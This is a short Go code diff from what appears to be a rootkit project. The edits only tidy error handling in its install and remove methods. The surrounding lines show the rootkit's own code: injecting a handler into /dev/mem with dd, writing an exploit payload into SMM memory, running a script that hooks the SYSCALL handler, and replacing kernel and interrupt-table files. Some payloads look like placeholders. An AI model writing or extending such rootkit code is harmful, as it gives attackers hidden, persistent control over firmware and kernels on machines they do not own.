@@ -45,7 +45,7 @@ func (m *HandlerInjectMethod) Install(config *RootkitConfig) (*RootkitResult, er
 
 	cmd = exec.Command("dd", "if=/dev/stdin", "of=/dev/mem", "bs=1", "seek=0x0000FFF000")
 	cmd.Stdin = strings.NewReader(string(injectedHandler))
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	smmRegion := &SMMRegion{
 		Start:  0x0000FFF000,
@@ -116,7 +116,7 @@ func (m *SMRAMExploitMethod) Install(config *RootkitConfig) (*RootkitResult, err
 
 	injectionPayload := []byte("SMRAM_EXPLOIT_MARKER")
 	cmd = exec.Command("memtool", "-w", fmt.Sprintf("0x%x", smmBase), string(injectionPayload))
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	return &RootkitResult{
 		Success:   true,
@@ -230,7 +230,7 @@ func (m *ROPChainMethod) Remove(config *RootkitConfig) error {
 	if _, err := os.Stat(backupPath); err == nil {
 		cmd := exec.Command("cp", "-f", backupPath, kernelPath)
 		_, err := cmd.CombinedOutput()
-		os.Remove(backupPath)
+		_ = os.Remove(backupPath)
 		return err
 	}
 
@@ -278,7 +278,7 @@ echo "Hooking SYSCALL handler..."
 	}
 
 	cmd = exec.Command("sh", scriptPath)
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	return &RootkitResult{
 		Success:   true,
@@ -299,7 +299,7 @@ func (m *InterruptHookMethod) Remove(config *RootkitConfig) error {
 	if _, err := os.Stat(backupPath); err == nil {
 		cmd := exec.Command("cp", "-f", backupPath, idtPath)
 		_, err := cmd.CombinedOutput()
-		os.Remove(backupPath)
+		_ = os.Remove(backupPath)
 		return err
 	}
 
